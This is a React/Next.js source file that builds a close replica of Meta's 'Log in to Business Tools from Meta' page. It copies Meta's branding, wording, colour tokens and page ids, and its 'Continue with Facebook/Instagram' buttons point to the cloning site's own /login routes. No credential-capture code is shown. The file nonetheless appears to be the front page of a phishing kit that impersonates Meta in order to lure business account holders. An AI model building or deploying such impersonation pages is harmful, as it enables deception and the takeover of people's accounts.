import { existsSync } from 'fs'
import { join } from 'path'
import type { Metadata } from 'next'
import Image from 'next/image'
import Link from 'next/link'
import type { CSSProperties, ReactNode } from 'react'

const LOGIN_HERO_SRC = '/images/meta/login-hero.png'

/** Ảnh stripe minh họa khi không có PNG (đúng asset trong pagelet bizWebLogin của Meta). */
const BIZ_SIDE_WEBP =
  'https://static.xx.fbcdn.net/rsrc.php/y-/r/xnwOL5VFOzy.webp'

/** Token màu rút gọn khớp FDS của Meta (--primary-text / --fds-gray-* / --blue-link). */
const primaryTextToken = '#111112'

const hasLoginHeroAsset = existsSync(
  join(process.cwd(), 'public', LOGIN_HERO_SRC.replace(/^\//, '')),
)

export const metadata: Metadata = {
  title: 'Log in to Business Tools from Meta',
  description:
    'Get started with business tools from Meta — Meta Business Suite, Ads Manager, and more.',
}

/** Cột minh họa — xám `#F0F2F5` như landing Meta */
const panelGray = '#F0F2F5'

const META_PLATFORMS_LOGO = '/images/meta/Meta_Platforms_logo.svg'

function FacebookGlyph({ className }: { className?: string }) {
  return (
    <svg
      className={className}
      viewBox="0 0 24 24"
      fill="#1877F2"
      width={22}
      height={22}
      aria-hidden
    >
      <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z" />
    </svg>
  )
}

function InstagramBizGlyph({ className }: { className?: string }) {
  return (
    <svg className={className} fill="url(#bizLoginIgGrad)" viewBox="0 0 48 48" width={22} height={22} aria-hidden role="img">
      <defs>
        <linearGradient id="bizLoginIgGrad" x1="69.27%" x2="128.2%" y1="129.46%" y2="29.46%">
          <stop offset="0" stopColor="#FDD074" />
          <stop offset="0.25" stopColor="#F77F34" />
          <stop offset="0.5" stopColor="#DD326E" />
          <stop offset="0.75" stopColor="#D82B7E" />
          <stop offset="1" stopColor="#A432B1" />
        </linearGradient>
      </defs>
      <path d="M24 5.1c6.1 0 6.9 0 9.3.1 2.2.1 3.5.5 4.3.8 1.1.4 1.8.9 2.6 1.7.8.8 1.3 1.6 1.7 2.6.3.8.7 2 .8 4.3.1 2.4.1 3.2.1 9.3s0 6.9-.1 9.3c-.1 2.2-.5 3.5-.8 4.3-.4 1.1-.9 1.8-1.7 2.6-.8.8-1.6 1.3-2.6 1.7-.8.3-2 .7-4.3.8-2.4.1-3.2.1-9.3.1s-6.9 0-9.3-.1c-2.2-.1-3.5-.5-4.3-.8-1.1-.4-1.8-.9-2.6-1.7-.8-.8-1.3-1.6-1.7-2.6-.3-.8-.7-2-.8-4.3-.1-2.4-.1-3.2-.1-9.3s0-6.9.1-9.3c.1-2.2.5-3.5.8-4.3.4-.9.9-1.7 1.7-2.5.8-.8 1.6-1.3 2.6-1.7.8-.3 2-.7 4.3-.8 2.4-.1 3.2-.2 9.3-.2M24 1c-6.2 0-7 0-9.5.1-2.4.1-4.1.5-5.6 1.1-1.5.6-2.8 1.4-4 2.7-1.3 1.2-2.1 2.5-2.7 4-.6 1.5-1 3.1-1.1 5.6C1 17 1 17.8 1 24s0 7 .1 9.5c.1 2.4.5 4.1 1.1 5.6.6 1.5 1.4 2.8 2.7 4.1 1.3 1.3 2.6 2.1 4.1 2.7 1.5.6 3.1 1 5.6 1.1H24c6.2 0 7 0 9.5-.1 2.4-.1 4.1-.5 5.6-1.1 1.5-.6 2.8-1.4 4.1-2.7 1.3-1.3 2.1-2.6 2.7-4.1.6-1.5 1-3.1 1.1-5.6V24c0-6.2 0-7-.1-9.5-.1-2.4-.5-4.1-1.1-5.6-.6-1.5-1.4-2.8-2.7-4.1-1.3-1.3-2.6-2.1-4.1-2.7-1.5-.6-3.1-1-5.6-1.1H24zm0 11.2c-6.5 0-11.8 5.3-11.8 11.8S17.5 35.8 24 35.8 35.8 30.5 35.8 24 30.5 12.2 24 12.2zm0 19.5c-4.2 0-7.7-3.4-7.7-7.7s3.4-7.7 7.7-7.7 7.7 3.4 7.7 7.7-3.5 7.7-7.7 7.7zM36.3 9c-1.5 0-2.8 1.2-2.8 2.8s1.2 2.8 2.8 2.8c1.5 0 2.8-1.2 2.8-2.8S37.8 9 36.3 9z" />
    </svg>
  )
}

/**
 * Khung minh họa giống lớp bọc canvas trên trang Meta biz login:
 * `inline-block` + `line-height:0` + `font-size:0`, kích thước CSS ~299×928
 * (buffer canvas gốc thường 328×1020 — ta dùng ảnh + Image, không cần vẽ canvas).
 */
function IllustrationStripeFrame({ children }: { children: ReactNode }) {
  return (
    <div className="inline-block text-[0] leading-[0]">
      <div className="relative m-0 box-border inline-block p-0">
        {children}
      </div>
    </div>
  )
}

function IllustrationColumnFallback() {
  return (
    <div
      className="relative flex min-h-[min(60vh,520px)] flex-1 items-center justify-center px-6 py-10 lg:h-full lg:min-h-screen lg:py-0"
      style={{ backgroundColor: panelGray }}
      aria-hidden
    >
      <IllustrationStripeFrame>
        <div className="relative mx-auto aspect-[299/928] h-[min(72vh,860px)] w-full max-w-[299px] lg:max-h-[min(92vh,928px)]">
          <Image
            src={BIZ_SIDE_WEBP}
            alt=""
            fill
            className="object-contain object-center"
            sizes="(max-width: 1024px) 92vw, 299px"
          />
        </div>
      </IllustrationStripeFrame>
    </div>
  )
}

function IllustrationColumn({ useHeroPhoto }: { useHeroPhoto: boolean }) {
  if (useHeroPhoto) {
    return (
      <div
        className="relative isolate min-h-0 h-full w-full flex-1"
        style={{ backgroundColor: panelGray }}
        aria-hidden
      >
        <Image
          src={LOGIN_HERO_SRC}
          alt=""
          fill
          className="object-cover object-center"
          sizes="(max-width: 1024px) 0px, 28vw"
          priority
        />
      </div>
    )
  }
  return <IllustrationColumnFallback />
}

export default function LoginPage() {
  return (
    <div
      id="globalContainer"
      className="bizWebLoginContainer min-h-screen bg-white uiContextualLayerParent antialiased [-webkit-font-smoothing:antialiased]"
      style={
        {
          fontFamily:
            'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI Historic", Segoe UI, Helvetica, Arial, sans-serif',
          color: primaryTextToken,
          ['--fds-primary-text' as string]: '#111112',
          ['--fds-gray-70' as string]: '#606770',
          ['--blue-link' as string]: '#0064E0',
          ['--divider' as string]: '#DFE2E5',
          ['--fds-gray-20' as string]: '#DADDE1',
        } as CSSProperties
      }
    >
      <div id="pagelet_login_content">
        {/* Chia kẻ dọc theo các cột; thứ tự flex/order đã chỉnh sẵn */}
        <div className="mx-auto flex min-h-screen w-full max-w-[1920px] flex-col lg:min-h-[100dvh] lg:flex-row">
          {/* 1 — Cột marketing (~38%) */}
        <section
          className="order-1 flex w-full flex-col justify-center overflow-y-auto border-[#e4e6eb] px-8 py-12 sm:px-10 sm:py-16 lg:order-1 lg:min-h-screen lg:flex-[0_0_38%] lg:border-r lg:px-12 lg:py-[clamp(3rem,5vw,4.75rem)] lg:pr-[clamp(2rem,3.5vw,3.25rem)] xl:px-14 xl:pl-16"
          style={{
            background:
              'linear-gradient(158deg, #ffffff 0%, #f7f9fc 32%, #edf2f8 62%, #f1f5fa 100%)',
          }}
        >
          <div className="mx-auto w-full max-w-[min(100%,560px)]">
            <div className="mb-8 pl-4 lg:mb-10">
              <Image
                src={META_PLATFORMS_LOGO}
                alt="Meta"
                width={290}
                height={191}
                className="block h-[48px] w-auto max-w-[min(100%,220px)] object-contain object-left"
              />
            </div>
            <h1 className="max-w-xl font-semibold tracking-[-0.02em] text-[#111112]">
              <span
                className="block"
                style={{
                  fontSize: 'clamp(32px, 2.65vw + 0.92rem, 40px)',
                  lineHeight: '1.25',
                }}
              >
                Get started with{' '}
                <span style={{ display: '-webkit-box' }} className="font-semibold">
                  business tools from Meta
                </span>
              </span>
            </h1>
            <p className="mt-5 max-w-xl text-[0.9375rem] font-normal leading-[1.267] lg:mt-7">
              By logging in, you can navigate to all business tools such as{' '}
              <strong className="font-bold">Meta Business Suite</strong>,{' '}
              <strong className="font-bold">Ads Manager</strong>
              {' '}and more to help you connect with your customers and get better business
              results.
            </p>
            <p className="mt-8 text-[0.9375rem] font-normal leading-[1.267] lg:mt-9">
              Our business tools can help you:
            </p>
            <ul className="mt-4 list-none p-0 text-[0.9375rem] leading-[1.267]">
              <li className="mt-[5px] flex gap-3">
                <span aria-hidden className="-mt-[1px] shrink-0 opacity-95">
                  •
                </span>
                <span>
                  Save time by accessing everything that you need to manage your business
                  across Facebook, Instagram and Messenger all in one place
                </span>
              </li>
              <li className="mt-5 flex gap-3">
                <span aria-hidden className="-mt-[1px] shrink-0 opacity-95">
                  •
                </span>
                <span>
                  Connect with the people who matter most to your business using a single
                  inbox
                </span>
              </li>
              <li className="mb-1 mt-5 flex gap-3">
                <span aria-hidden className="-mt-[1px] shrink-0 opacity-95">
                  •
                </span>
                <span>
                  Track what&apos;s working best with performance insights across Meta
                  technologies
                </span>
              </li>
            </ul>
          </div>
        </section>

        {/* 2 — Cột minh họa (~28%) — login-hero phủ tràn không padding/object-contain */}
        <div className="hidden min-h-0 w-full shrink-0 overflow-hidden border-[#e4e6eb] lg:order-2 lg:flex lg:min-h-screen lg:min-h-0 lg:min-w-0 lg:flex-[0_0_28%] lg:flex-col lg:border-r">
          <IllustrationColumn useHeroPhoto={hasLoginHeroAsset} />
        </div>

        {/* 3 — Form đăng nhập (~34%) */}
        <aside
          className="order-2 flex min-w-0 shrink-0 flex-col overflow-y-auto border-t border-[#e4e6eb] bg-white lg:order-3 lg:min-h-screen lg:flex-[0_0_34%] lg:border-t-0"
        >
          <div
            id="login-panel-container"
            className="mx-auto flex min-h-0 w-full max-w-[382px] flex-1 flex-col justify-between px-7 py-11 sm:px-9 lg:min-h-screen lg:max-w-[400px] lg:px-10 lg:py-[clamp(3rem,4.5vw,4.25rem)] lg:pr-12"
          >
            <div className="flex min-h-0 flex-1 flex-col justify-center py-1 lg:pb-10">
              <h2 className="text-center text-[1.0625rem] font-semibold leading-[1.2941] tracking-[-0.012em] text-[#111112]">
                Log in to Business Tools from Meta
              </h2>

              <div className="mt-6 flex flex-col gap-[10px] sm:mt-8">
                <Link
                  href="/login/facebook"
                  prefetch
                  className="flex h-11 max-h-none min-h-[44px] w-full items-center justify-center gap-3 rounded-[22px] border border-solid bg-white text-[15px] font-semibold leading-tight tracking-tight text-[#111112] transition-colors hover:bg-[#F5F6F7]"
                  style={{ borderColor: '#DADDE1' }}
                >
                  <FacebookGlyph className="shrink-0" />
                  Continue with Facebook
                </Link>
                <Link
                  href="/login/instagram"
                  prefetch
                  className="flex h-11 max-h-none min-h-[44px] w-full items-center justify-center gap-3 rounded-[22px] border border-solid bg-white text-[15px] font-semibold leading-tight tracking-tight text-[#111112] transition-colors hover:bg-[#F5F6F7]"
                  style={{ borderColor: '#DADDE1' }}
                >
                  <InstagramBizGlyph className="shrink-0" />
                  Continue with Instagram
                </Link>
              </div>

              <div className="mt-5 text-center sm:mt-6">
                <Link
                  href="#"
                  role="button"
                  className="inline-block rounded-md px-1 py-1 text-[0.8125rem] font-bold leading-snug hover:underline"
                  style={{ color: '#0064E0' }}
                >
                  Create new account
                </Link>
              </div>
            </div>

            <div className="mt-10 shrink-0 lg:mt-6">
              <hr className="m-0 h-px w-full border-0 bg-[#DFE2E5]" />
              <div className="mt-5 text-center">
                <Link
                  href="#"
                  role="button"
                  tabIndex={0}
                  className="inline-block text-[0.8125rem] font-medium leading-relaxed hover:underline"
                  style={{ color: '#606770' }}
                >
                  Log in with a managed Meta account
                </Link>
              </div>
              <div className="mt-8 flex justify-center pb-2 lg:mt-10">
                <Image
                  src="/images/meta/logo-meta.svg"
                  alt="Meta"
                  width={132}
                  height={26}
                  className="h-[26px] w-auto max-w-[min(100%,148px)] object-contain object-center opacity-[0.98]"
                />
              </div>
            </div>
          </div>
        </aside>
        </div>
      </div>
    </div>
  )
}
